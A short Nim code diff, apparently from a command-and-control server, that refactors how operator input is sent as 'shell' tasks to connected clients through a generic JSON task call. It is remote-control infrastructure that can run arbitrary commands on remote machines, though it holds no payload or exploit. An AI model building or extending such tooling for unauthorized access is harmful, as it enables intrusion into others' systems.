@@ -1,11 +1,7 @@
 import asyncdispatch, threadpool, asyncfutures, parseopt, tables
-import strutils, sequtils
+import strutils, sequtils, json
 
-import types, logging
-
-import ../clientTasks/shell
-# import commands/mainCommands/backCmd
-import communication
+import types, logging, communication
 
 proc procStdin*(server: C2Server) {.async.} =
 
@@ -32,7 +28,7 @@ proc procStdin*(server: C2Server) {.async.} =
           c2cli.mode = ClientInteractMode
         else:
           for client in server.cli.handlingClient:
-            let task = await shell.sendTask(client, args.join(" "))
+            let task = await client.sendClientTask("shell", %*[ args.join(" ") ])
             await task.awaitResponse()
       else:
         for command in c2cli.commands:
